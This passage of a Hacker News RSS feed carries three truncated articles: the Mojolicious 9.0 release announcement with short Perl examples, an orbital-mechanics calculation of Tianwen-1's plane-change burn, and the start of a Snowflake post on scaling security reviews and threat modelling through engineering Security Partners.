data-slate-string="true">Focus on the Problem</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Jobs to Be Done</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Problems vs Requirements</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Opportunities: Choosing the Right Problem</span></span></span></li></ul><p data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><strong><span data-slate-string="true">Month 5: Epics, Stories and Tasks</span></strong></span></span></p><ul data-slate-node="element"><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Roadmap</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">User Stories</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Sprints</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Retrospectives</span></span></span></li></ul><p data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Month 5: Coming Soon</span></span></span></p></div></div>]]>
            </description>
            <link>https://lu.ma/xtrqs5v2</link>
            <guid isPermaLink="false">hacker-news-small-sites-26137582</guid>
            <pubDate>Mon, 15 Feb 2021 00:15:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mojolicious 9.0]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26137542">thread link</a>) | @peteretep
<br/>
February 14, 2021 | https://mojolicious.io/blog/2021/02/14/announcing-mojolicious-9-0/ | <a href="https://web.archive.org/web/*/https://mojolicious.io/blog/2021/02/14/announcing-mojolicious-9-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

              <section id="section-1">
                  <p>The Mojolicious Core Team is delighted to announce the release and immediate availability of version 9.0 of the <a href="https://mojolicious.org/">Mojolicious</a> real-time web framework.
Every Mojolicious major release has a <a href="https://docs.mojolicious.org/Mojolicious#CODE-NAMES">code name</a> based on a unicode character and this one is lovingly named "Waffle" üßá!</p>

<p>Every major release I think that there can't be much more to add or change in Mojolicious and then when the next one arrives I reflect on how much has changed since I last thought that.
In <a href="https://metacpan.org/release/SRI/Mojolicious-9.0">9.0</a> there's far too much to discuss each at length, so I'm going to highlight some of my favorites and then include a distilled list of changes since 8.0.</p>

<h2>Perl 5.16 and beyond</h2>

<p>Mojolicious now requires Perl version 5.16. This change gives us useful tools to build Mojolicious including the <code>__SUB__</code> token for building self-referential callbacks without leaking.
We were pleased that the community response since the change a few months ago has been ... well crickets.
This is great news since we do hope to move to Perl 5.20 in the not so distant future so that we can use Perl's native signatures once that is a sound option for us.
We are already encouraging the use of signatures both in the documentation and in our code generation commands.</p>

<h2>Asynchronous Functionality</h2>

<p>Clearly the highlight of the pre-9.0 development cycle has been the integration of Async/Await.
Thanks to Paul Evans (LeoNerd)'s efforts, when you have <a href="https://metacpan.org/pod/Future::AsyncAwait">Future::AsyncAwait</a> installed Mojolicious can use its new keywords <code>async</code> and <code>await</code> to provide the most seamless asynchronous development possible, something that is becoming more and more the standard for asynchronous code in other languages.
Writing a non-blocking endpoint is now as simple as</p>

<pre><code>use Mojolicious::Lite -signatures, -async_await;

# Request HTML titles from two sites non-blocking
get '/' =&gt; async sub ($c) {
  my $mojo_tx    = await $c-&gt;ua-&gt;get_p('https://mojolicious.org');
  my $mojo_title = $mojo_tx-&gt;result-&gt;dom-&gt;at('title')-&gt;text;
  my $cpan_tx    = await $c-&gt;ua-&gt;get_p('https://metacpan.org');
  my $cpan_title = $cpan_tx-&gt;result-&gt;dom-&gt;at('title')-&gt;text;

  $c-&gt;render(json =&gt; {mojo =&gt; $mojo_title, cpan =&gt; $cpan_title});
};

app-&gt;start;
</code></pre>

<p>When I teach non-blocking to people I can now tell them to follow a trivial recipe for most non-blocking tasks.
Simply <code>await</code> any function that returns a promise and mark any function that uses <code>await</code> with the <code>async</code> keyword.
Note also that all <code>async</code> functions return promises so <code>await</code> any calls to them.
There are some optimizations you can make at times and top-level <code>await</code> (if you aren't in a Mojolicious webapp) can be a little strange but to a first approximation that's all you need to write a non-blocking webapp today!</p>

<p>Speaking of promises (which are at the heart of Async/Await), Mojo::Promise has grown a lot this cycle too, adding <code>all_settled</code>, <code>any</code>, <code>map</code>, <code>timer</code>, and <code>timeout</code> class methods, changing its constructor to be more like the one in JavaScript and to warn when an unhandled rejected promise is destroyed.
The latter can help in development where such cases used to hide errors, now, much like the browser, you can at least find where things are going wrong even if you didn't wire all your promises to a catch callback like you should.</p>

              </section>
              <section id="section-2">
                  <h2>Focus on Containerization and Cloud Deployments</h2>

<p>The Mojolicious Core Team is aware that more and more deployments are in containers and cloud services these days and we've been thinking of ways to make that easier.
With 9.0 we've added two new features specifically designed to help with these types of deployments.</p>

<p>Most existing applications assume a standard deployment by an unprivileged user behind a reverse proxy, but with new deployment strategies the number of configurations an application might expect are too numerous to expect each application to support.
To address this we've added support for <a href="https://docs.mojolicious.org/Mojolicious/Guides/Cookbook#Deployment-specific-plugins">deployment specific plugins</a> that help you add deployment-level functionality to existing applications.
Now the deployer is in control of these features, rather than needing to ask the application author to add support.</p>

<p>We've also extended the existing <a href="https://docs.mojolicious.org/Mojolicious/Guides/Cookbook#Reverse-proxy">reverse proxy</a> support to allow for multiple trusted proxies, specifically when you know what the expected IP address or CIDR network you're expecting proxy requests from.
This can be useful both when deploying from say Kubernetes where it is likely you'll have several layers of local proxies, or when you're behind a third-party proxy like CloudFlare, who publish a list of their proxy networks.
This is an important safety feature in these situations, blindly trusting forwarding headers can lead to <a href="https://twitter.com/logicbomb_1/status/1354452751619559428">big problems</a>.</p>

<p>Also, we've noticed that many cloud deployment tools are based on YAML, so we've added a YAML configuration file loader to our existing Perl and JSON configuration loaders.
Because YAML is a tricky target and because ours is technically not-quite-YAML, we've called ours cheekily <a href="https://docs.mojolicious.org/Mojolicious/Plugin/NotYAMLConfig">NotYAMLConfig</a>.
In the unlikely event that that distinction should matter for your needs, you can load a specific YAML module from CPAN.</p>

<p>But it isn't just functionality, we've added a Dockerfile generation (<code>myapp generate dockerfile</code>) and added a Container <a href="https://docs.mojolicious.org/Mojolicious/Guides/Cookbook#Containers">Cookbook recipe</a> to the documentation.
We've also added a <a href="https://docs.mojolicious.org/Mojolicious/Guides/Cookbook#Envoy">Cookbook recipe</a> for the popular cloud-native proxy <a href="https://www.envoyproxy.io/">Envoy</a>.
If you have other common container or cloud recipes that you think should be added, please let us know!</p>

<h2>Documentation Improvements</h2>

<p>Speaking of documentation, you might have noticed that both our <a href="https://docs.mojolicious.org/">documentation site</a> and <a href="https://twitter.com/perlmojo/status/1343932370106392577/photo/1">built-in templates</a> for 404 and 500 pages have gotten a face lift.</p>

<blockquote><p dir="ltr" lang="en">The Mojolicious 8.69 release brings redesigned exception and not_found pages with a fresh new look, enjoy. <a href="https://t.co/MHzvYnBJJw">pic.twitter.com/MHzvYnBJJw</a></p>‚Äî Mojolicious (@perlmojo) <a href="https://twitter.com/perlmojo/status/1343932370106392577?ref_src=twsrc%5Etfw">December 29, 2020</a></blockquote>



<p>They're even prettier and easier to read than before, they're responsive, and they have a newer code library (highlight.js) to better render our code.
Further the documentation site is now redeployed immediately on any push to master of the website or the main Mojolicious projects, <code>mojolicious</code>, <code>mojo-pg</code>, and <code>minion</code>, so that you always have the most up-to-date docs at your fingertips.</p>

<p>Along with the container and cloud-native changes I've already highlighted, we have updated our documentation to use of upcoming Perl native signatures throughout and paired it with updating our <code>app</code> and <code>lite-app</code> generators to generate applications with signatures too.</p>

<h2>Routing (and Rendering)</h2>

<p>The routing engine is an often overlooked part of a web framework but it really is at the heart of everything that it does.
It can also be a source of confusion or frustration, especially when it doesn't do what you expect.
For 9.0 we've made the router both safer and more closely aligned to user expectations.</p>

<p>The biggest change is that Mojolicious now prevents applications from using reserved placeholders in routes.
This was originally considered a "feature" because it allowed very terse route definitions for quick apps, but in practice most people that understood how that worked just used the long form while unsuspecting newcomers would trip on it from time to time.
We've also made several cases throw exceptions when routing would fail that used to fail silently or unexpectedly.
When a route points to a missing controller, a namespace without a controller or a controller without an action, you now get an exception rather than a 404, which would often confuse people.
Additionally, you get an exception when when auto-rendering fails or a call to render cannot render a response, which would appear to hang (while it actually was trying to wait for a delayed response that was never going to happen).</p>

<p>We've even simplified some of the routing method names themselves.
We've removed the lesser-used <code>detour</code> and <code>route</code> methods in favor of the more generic <code>any</code> method.
We've renamed method that designates which HTTP methods to respond to (usually when picking several but not all of them, e.g. <code>GET</code> and <code>POST</code> but not <code>any</code>) from <code>via</code> to <code>methods</code>.
We've also renamed the method that designates conditional routing from <code>over</code> to <code>requires</code>.
I'm especially excited about this one since <code>over</code> implied a contrast with the commonly used <code>under</code> method, where no such contrast is meant to be implied; they do very different things.</p>

<h2>Logging</h2>

<p>The big one for me is that Mojolicious now is capable of sanely using a contextual logger!
Mojolicious applications have a <code>log</code> attribute that holds a <code>Mojo::Log</code> instance, however that logger is global to the application and any context you'd want to add is only for a given request/response cycle.
Unlike blocking frameworks, a Mojolicious app might switch between several requests before any are rendered, meaning manually keeping context attached to that global logger was nearly impossible.
With 9.0 we now have the ability to use a per-controller "child" logger which descends from the global logger and still logs via it, but can keep its own context information.
It feeds that information to its parent when you log from it.</p>

<p>By default, these child loggers now have a random request id attached to it, however you can put whatever context you'd like to add there.
You can also pass these loggers (themselves an instance of <code>Mojo::Log</code>) to models or other code that might want to log with that context attached.</p>

<p>We've also improved logging performance in cases where generating the log message is expensive and useless if the log level means that the log message is not emitted.
If you pass a closure (code reference) to the logger's <code>debug</code>, <code>info</code>, <code>warn</code>, <code>error</code>, and <code>fatal</code> methods and the logger will only invoke that closure if the log level check is met.
In fact this improved Mojolicious' own performance metrics by 10%!</p>

<pre><code>$c-&gt;log-&gt;debug(sub{ 'Thought you might want to know: ' . generate_expensive_log_output() });
</code></pre>

<p>Please note that we have changed the log format slightly so be aware if you care about such things.</p>

<p>And to simplify things, we've removed the confusing behavior of logging to a ‚Ä¶</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mojolicious.io/blog/2021/02/14/announcing-mojolicious-9-0/">https://mojolicious.io/blog/2021/02/14/announcing-mojolicious-9-0/</a></em></p>]]>
            </description>
            <link>https://mojolicious.io/blog/2021/02/14/announcing-mojolicious-9-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26137542</guid>
            <pubDate>Mon, 15 Feb 2021 00:08:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tianwen-1 plane change planning]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136993">thread link</a>) | @parsecs
<br/>
February 14, 2021 | https://destevez.net/2021/02/tianwen-1-plane-change-planning/ | <a href="https://web.archive.org/web/*/https://destevez.net/2021/02/tianwen-1-plane-change-planning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9660">

	

	<div>
		
<p>Today, the Chinese media published a short piece of news stating that tomorrow, 2021-02-15, <a href="https://weibo.com/2803301701/K1Txro221?type=comment">Tiawen-1 will make make a plane change to a polar orbit</a>. The post is accompanied by an short video, which includes an animation depicting the manoeuvre. A screenshot of the video is shown below. As the spacecraft arrives to apoapsis, it effects a plane change into an ascending polar orbit.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/tianwen1-plane-change.png"><img width="644" height="343" src="https://destevez.net/wp-content/uploads/2021/02/tianwen1-plane-change-644x343.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/tianwen1-plane-change-644x343.png 644w, https://destevez.net/wp-content/uploads/2021/02/tianwen1-plane-change-300x160.png 300w, https://destevez.net/wp-content/uploads/2021/02/tianwen1-plane-change-768x409.png 768w, https://destevez.net/wp-content/uploads/2021/02/tianwen1-plane-change.png 1020w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Tianwen-1 plane change manoeuvre. Source <a rel="noreferrer noopener" href="https://weibo.com/rmrb" target="_blank">‰∫∫Ê∞ëÊó•Êä•</a> in <a href="https://weibo.com/2803301701/K1Txro221?type=comment">weibo.com</a></figcaption></figure>



<p>This is a good moment to review the maths behind a plane change manoeuvre and compute what the manoeuvre will look like.</p>



<p>Basically, a plane change involves changing the direction of the <a href="https://en.wikipedia.org/wiki/Specific_angular_momentum">specific angular momentum vector</a> \(h = r \times v\), which is one of the conserved quantities of a Keplerian orbit, and is orthogonal to the orbital plane. Understanding a plane change in terms of the angular momentum shows that it‚Äôs best to perform the plane change at apoapsis, when \(r\) is largest, and so the same thrust force produces more <a href="https://en.wikipedia.org/wiki/Torque">torque</a>, due to the larger lever arm.</p>



<p>If we perform a plane change at a certain point \(r\) along the orbit, the final angular momentum \(h_1 = r \times v_1\) will be orthogonal to \(r\). In other words, \(r\) must still lie in the final orbital plane. So the only thing that we can do is rotate the orbital plane along the axis \(r\). For a plane change at the apoapsis, we are limited to swinging the orbital plane along the <a href="https://en.wikipedia.org/wiki/Apse_line">line of apsides</a>.</p>



<p>If we denote initial quantities with the subscript 0 and final quantities with the subscript 1, we have \(h_1 ‚Äì h_0 = r \times (v_1 ‚Äì v_0)\). For a plane change at apoapsis, \(r\) and \(v\) are orthogonal, and so we see that the change in angular momentum \(h_1 ‚Äì h_0\) and the delta-V \(\Delta v = v_1 ‚Äì v_0\) are related by a factor of \(\|r\|\) and a 90¬∫ rotation. Thus, it is possible to plan the manoeuvre with angular momentums, and then easily translate the result into delta-V. For the general case in which \(r\) and \(v\) are not orthogonal, a similar procedure can be applied, since we are only interested in the projection of \(v\) onto the plane orthogonal to \(r\).</p>



<p>Denoting by \(\alpha\) the angle between \(h_0\) and \(h_1\) and assuming that we only want to change the direction of the angular momentum but not its magnitude, we have\[\|h_1-h_0\| = \|h_0\| \sqrt{2 (1-\cos \alpha)}.\]</p>



<p>In order to compute the angle \(\alpha\), let us consider the following geometric scenario. Denote by \(\delta\) the angle between a certain vector \(h\) and the \(xy\)-plane, and by \(\beta\) the angle between \(r\) and the \(z\)-axis. Let us consider the rotation of the vector \(h\) about the axis given by \(r\), and let \(\gamma\) be the angle of the rotation that brings \(h\) into the \(xy\)-plane. Then we have\[\sin \delta = \sin \gamma \sin \beta.\]Applying this to \(h = h_0\), we see that \(\delta = \pi/2 ‚Äì i_0\), where \(i_0\) denotes the initial inclination. Thus,\[\cos i_0 = \sin \gamma_0 \sin \beta.\]We can write the same equation for the final angular momentum \(h_1\), and since in this case we are interested in achieving a polar orbit with \(i_1 = \pi/2\), we obtain\[0 = \sin \gamma_1 \sin \beta,\]which implies \(\gamma_1 = 0\). In the general case in which the final orbit is not polar the calculations are more involved, but the same procedure can be used.</p>



<p>Now, the angle \(\alpha\) is basically \(|\gamma_0 ‚Äì \gamma_1|\) (some care should be taken with the signs here), because \(\gamma_0\) and \(\gamma_1\) are rotations of the vectors \(h_0\) and \(h_1\) on the plane orthogonal to \(r\), on which both of these vectors lie, and so that the result of these rotations gives the same vector (namely the intersection of the plane orthogonal to \(r\) and the \(xy\)-plane). Therefore, a rotation of angle \(\pm|\gamma_0 ‚Äì \gamma_1|\) transforms \(h_0\) in \(h_1\). In the case of a final polar orbit we have\[\sin \alpha = \frac{\cos i_0}{\sin \beta}.\]</p>



<p>A more direct method of calculation of the required delta-V is given in the <a href="https://en.wikipedia.org/wiki/Orbital_inclination_change#Calculation">Wikipedia article about plane change manoeuvres</a>, but I think that this way of working can give more geometric insight, even if it is a longer procedure.</p>



<p>Let us now work with the orbit of Tianwen-1. For this planning exercise, I have started with my <a href="https://twitter.com/ea4gpz/status/1359433349018882050">planning of the Mars orbit insertion burn</a>. The initial state vector comes from before the burn (and was given in <a href="https://destevez.net/2021/02/tianwen-1-mars-centric-state-vectors/" data-type="post" data-id="9635">this post</a>). I have adjusted the start of the burn to 11:52:55 UTC to match the timing we saw in <a href="https://www.youtube.com/watch?v=1myQ5tIig0w">AMSAT-DL‚Äôs livestream from Bochum</a> (taking into account 641 seconds of light-time delay), and the duration of the burn to 888 seconds so as to give an orbital period very close to 10 days, as given in this <a href="http://www.cnsa.gov.cn/n6758823/n6758838/c6811243/content.html">official statement from CNSA</a> about the success of the Mars orbit insertion. The period given there is certainly rounded rather than exact, but for this planning exercise we don‚Äôt need the exact period, since we are more interested in computing the required burn rather than in knowing exactly when is the apoapsis passage.</p>



<p>In fact, an error in the orbital period will give a proportional error in the apoapsis radius, and hence in the required delta-V, but all the remaining geometrical parameters will be very similar. It is important to remark that even though burning exactly at apoapsis minimizes the delta-V, the radius \(r\) changes quite slowly around apoapsis, so it is possible that the burn will happen several hours away from apoapsis, favouring other conditions such as groundstation availability. For this manoeuvre, unlike for the Mars orbit injection, timing is not very critical, so it is difficult to be sure of exactly when it will be done.</p>



<p>In <a href="http://gmat.sourceforge.net/docs/">GMAT</a>, we can see that after Mars orbit insertion the angular momentum is 17658 km¬≤/s, and the inclination is 11 degrees (matching the inclination of the incoming hyperbolic orbit). We still need to compute the angle \(\beta\) between the vector \(r\) at apoapsis and the \(z\)-axis. This can be done by using the apoapsis radius, which is 182602 km, and the \(z\) component of the position at apoapsis, which is -31427 km. With these values we get \(\beta = 100\ \mathrm{deg}\). Using the formula above we get that the angle \(\alpha\) that the angular momentum needs to rotate is 85.24 degrees. Note that this angle is larger than the change in inclination, which is 79 degrees. This always happens when the burn is not at the <a href="https://en.wikipedia.org/wiki/Orbital_node">line of nodes</a>.</p>



<p>The fact that \(\alpha\) is smaller than 90 degrees can justify that the plane change will be made in an ascending direction. A plane change to the same polar orbit but in a descending direction could be done by using \(-h_1\) instead of \(h_1\). In that case the angle \(\alpha\) would be 94.76 degrees, and so the burn will be slightly more expensive.</p>



<p>Using one of the formulas given above, we get\[\|h_1 ‚Äì h_0\| = 1.354 \|h_0\| = 23916\ \mathrm{km}^2/\mathrm{s}.\]Dividing by the apoapsis radius, we get\[\|\Delta v\| = \|h_1 ‚Äì h_0\|/\|r\| = 130.97\ \mathrm{m}/\mathrm{s}.\]</p>



<p>Now that we know the magnitude of the delta-V, the next question is how to write the delta-V vector. Usually these are written in a VNB coordinate frame. In this case, the delta-V will lie in the VN-plane, since \(v\) and \(r\) are orthogonal. Knowing that the angle between \(v_0\) and \(v_1\) is \(\alpha\) and that the unit vector \(V\) of the VNB frame points along \(v_0\), we see that\[v_1 = (\cos \alpha V + \sin \alpha N)\|v_0\|,\]so that\[v_1 ‚Äì v_0 = ((\cos \alpha ‚Äì 1) V + \sin \alpha N)\|v_0\|.\]</p>



<p>For Tianwen-1, we have \(\|v_0\| = 93.7\ \mathrm{m}/\mathrm{s}\), so the (V,N) coordinates of \(\Delta v\) are (-88.69, 96.37) m/s. Plugging these numbers as an impulse burn at apoapsis in GMAT, we see that the calculations are correct and the inclination of the resulting orbit is very close to 90 degrees, while the magnitude of the angular momentum has been maintained. The two figures below show the results of this impulse burn propagated to the next periapsis.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_046.png"><img width="644" height="315" src="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_046-644x315.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_046-644x315.png 644w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_046-300x147.png 300w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_046-768x376.png 768w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_046.png 1350w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Impulse burn (top view)</figcaption></figure>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_047.png"><img width="644" height="315" src="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_047-644x315.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_047-644x315.png 644w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_047-300x147.png 300w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_047-768x376.png 768w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_047.png 1350w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Impulse burn (perspective view)</figcaption></figure>



<p>To compute the burn time \(T\) for a finite burn that achieves the required delta-V, we use\[T = \frac{v_e m_0}{F} (1 ‚Äì \exp(-\|\Delta v\|/v_e)),\]where \(v_e = 3154\ \mathrm{m}/\mathrm{s}\) is the exhaust speed of the thrusters, and the thrust \(F\) is 3kN. This gives 153.12 seconds. To enter the finite burn in GMAT it is also necessary to compute the direction of the delta-V vector in inertial coordinates. The VNB frame can‚Äôt be used, since it will change throughout the burn. This is easy to do, by using the values of \(r\) and \(v_0\) in the Mars inertial frame in order to compute the coordinates of V and N in this frame. The resulting orbit after performing this burn has almost the same angular momentum as the original orbit and an inclination close to 90 degrees, showing that our calculations are correct.</p>



<p>The figures below show the finite burn. They are almost identical to those of the impulse burn. The finite burn is marked with a yellow trace, but this can‚Äôt be seen because the spacecraft travels a short distance during the burn, in contrast to the Mars orbit insertion, where the velocity was much higher.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_048.png"><img width="644" height="315" src="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_048-644x315.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_048-644x315.png 644w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_048-300x147.png 300w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_048-768x376.png 768w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_048.png 1350w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Finite burn (top view)</figcaption></figure>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_049.png"><img width="644" height="315" src="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_049-644x315.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_049-644x315.png 644w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_049-300x147.png 300w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_049-768x376.png 768w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_049.png 1350w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Finite burn (perspective view)</figcaption></figure>



<p>This burn will spend 145.6 kg of fuel. According to our estimates for the fuel spent throughout the mission, only 45 kg of fuel will remain afterwards. This seems a bit low, so it is possible that our estimates have been too pessimistic, and the amount of remaining fuel will be closer to 100 kg.</p>



<p>Planning ahead, according to <a href="https://www.researchgate.net/publication/318234916_Overview_of_China%27s_2020_Mars_Mission_Design_and_Navigation">this article</a>, the apoapsis will then be lowered to achieve a parking orbit with period of around 2 days, from which the lander will be released. Finally, the orbiter will move to the remote sensing orbit, which is an 8 hour circular polar orbit. Note that part of the information in that article seems outdated. It mentions that ‚ÄúBecause the landing area is selected in the low-latitude zone‚Äù. However, the landing location is expected to be <a href="https://en.wikipedia.org/wiki/Utopia_Planitia">Uto‚Ä¶</a></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://destevez.net/2021/02/tianwen-1-plane-change-planning/">https://destevez.net/2021/02/tianwen-1-plane-change-planning/</a></em></p>]]>
            </description>
            <link>https://destevez.net/2021/02/tianwen-1-plane-change-planning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136993</guid>
            <pubDate>Sun, 14 Feb 2021 22:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Appsec Development: Keeping it all together at scale]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136766">thread link</a>) | @mooreds
<br/>
February 14, 2021 | https://r2c.dev/blog/2021/appsec-development-keeping-it-all-together-at-scale/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2021/appsec-development-keeping-it-all-together-at-scale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p><span>
      <a href="https://r2c.dev/static/ea0368389504e9c6ff75116c17c850e4/9a1cf/appsec-development.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Appsec development" title="Appsec development" src="https://r2c.dev/static/ea0368389504e9c6ff75116c17c850e4/9a1cf/appsec-development.png" srcset="https://r2c.dev/static/ea0368389504e9c6ff75116c17c850e4/139a5/appsec-development.png 290w,
https://r2c.dev/static/ea0368389504e9c6ff75116c17c850e4/c08bc/appsec-development.png 579w,
https://r2c.dev/static/ea0368389504e9c6ff75116c17c850e4/9a1cf/appsec-development.png 924w" sizes="(max-width: 924px) 100vw, 924px" loading="lazy">
  </a>
    </span></p>

<p>When I joined Snowflake ~2 years ago we were a medium sized startup, but well on our way to explosive growth over the next year. Until that point, threat models and security reviews were largely handled by a single person. </p>
<p>It did not take long for calendars to begin overflowing with security review meeting requests. Projects started becoming larger and much more complex to reason about. Soon they began to back up waiting for security review, delayed by weeks at a time.  </p>
<p><span>
      <a href="https://r2c.dev/static/bc86d4d3e17a1a9c6063152f7ee7bab4/d9199/unsustainable.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Unsustainable" title="Unsustainable" src="https://r2c.dev/static/bc86d4d3e17a1a9c6063152f7ee7bab4/d9199/unsustainable.png" srcset="https://r2c.dev/static/bc86d4d3e17a1a9c6063152f7ee7bab4/139a5/unsustainable.png 290w,
https://r2c.dev/static/bc86d4d3e17a1a9c6063152f7ee7bab4/c08bc/unsustainable.png 579w,
https://r2c.dev/static/bc86d4d3e17a1a9c6063152f7ee7bab4/d9199/unsustainable.png 960w" sizes="(max-width: 960px) 100vw, 960px" loading="lazy">
  </a>
    </span>
<em>Unsustainable</em></p>
<p>The way we were doing things wasn‚Äôt going to work. </p>
<p>We knew we had to take decisive action. </p>
<p>Rather than just trying to keep up with the security review backlog, we needed to develop an approach that would be distributed and <em>scalable</em>.</p>
<p>In this article we‚Äôll discuss:</p>
<ul>
<li>Challenges security teams face with informal, centralized security review</li>
<li>Threat model and security review evidence that stands up to scrutiny</li>
<li>Surprising ways increasing scale can slow things down</li>
<li>Going fast by deciding when <em>not</em> to threat model, and what to do instead</li>
</ul>
<p>Now the story of <del>a wealthy family who lost everything and the one son who had no choice but to keep them all together</del> a scrappy startup on its way to IPO, and the teams who had no choice but to scale their processes, together.</p>
<h2>What didn‚Äôt work: Security engineers threat model every story</h2>
<p>In the beginning, security review consisted of ad-hoc 30 minute meetings with project teams for most features they created. Many times, this occurred after code was already being written.</p>
<p>Sometimes the results were captured in Jira, but most of the time they were communicated verbally. Many decisions were forgotten or misinterpreted, making for frequent awkward discussions about blocked releases.</p>
<p>With evidence collection and coverage failing, we needed to bring sanity to the process before we could consider scale. Our first wins were simple:</p>
<ul>
<li>Meetings with engineering teams to understand how they get work done, and where</li>
<li>Security review processes and deliverables that <em>mostly</em> fit into existing software development processes</li>
<li>Custom Jira ticket types and workflows for security review</li>
<li>Standardized Markdown templates for consultation, threat modeling, and penetration testing engagements</li>
<li>An approach familiar to developers: peer reviewed deliverables committed to source control (GitHub), and validation using a combination of test cases and penetration tests</li>
<li>Peer review by multiple software engineers, then security engineers</li>
</ul>
<h3>Pros &amp; cons</h3>
<p>Peer review created accountability and engagement. Templates helped security engineers provide consistent, robust evidence that could be referenced at any time, reducing those awkward release time surprises.</p>
<p>Our updated review process captured the right evidence and helped make the work more visible. Initially we did not even know how deep the backlog was. Now it was clear that we were not going to be able to keep up with demand. Projects quickly began seeing delays, weeks in many cases. </p>
<h3>Realizations</h3>
<p>We were happy, but developers were mostly unhappy</p>
<p>We were slowing the business down, and engineering teams were vocal in letting us know. They demanded the ability to unblock themselves by performing security reviews, and we wanted to give it to them. But there was still work to be done to get them ready.</p>
<blockquote>
<p>Our strategy for scaling software security was (and is) <strong>not</strong> to hire an army of security engineers. Instead, we leverage our engineering culture and ownership values to <em>make every software engineer successfully own the security of what they produce.</em> </p>
</blockquote>
<h2>What didn‚Äôt work: Software engineers threat model every story</h2>
<p>Having every software engineer successfully own security did not happen overnight. </p>
<p>We started with a well known approach: Security Champions. At Snowflake, we call them Security Partners.</p>
<p>These champions are security aware software engineer volunteers who function as a point of contact and domain expert within their team. At Snowflake scale, volunteerism was not going to be enough. Security was not optional, every team needed representation.</p>
<p>We met with engineers and engineering leadership with a clear ask:</p>
<ul>
<li>At least 1 engineer on every team to function as a Security Partner </li>
</ul>
<p>We also provided a clear set of requirements that describe the ideal Security Partner:</p>
<ul>
<li>Strong engineering skills    </li>
<li>Visibility into key projects</li>
<li>Influential team member</li>
</ul>
<p>This criteria self-selected for senior engineers on each team who already felt a strong sense of ownership, including security. Now all we needed to do was show them how to do it.</p>
<p>Instead of threat modeling in isolation, Security Engineers began teaming up with Security Partners and Software Engineers on each threat model. Engineering teams became the owners of the process and deliverables while the product security team shifted to a facilitation role.</p>
<h3>Pros &amp; cons</h3>
<p>We had the basics of scale now, and the results were night and day. </p>
<p>Engineering teams felt they were in control of their destiny and the backlog stabilized. We taught the basics of <a href="https://en.wikipedia.org/wiki/STRIDE_(security)" target="_blank" rel="noopener">STRIDE</a>-based threat modeling to Security Partners, and had the majority of teams producing models for every new feature. We facilitated sessions, and teams could continue iterating on their own.</p>
<p>This part felt really good. The backlog was so bad, the delays so bad, and the overall perception of security was so bad that being able to give software engineers the autonomy and scale they wanted felt great, and they really appreciated it.</p>
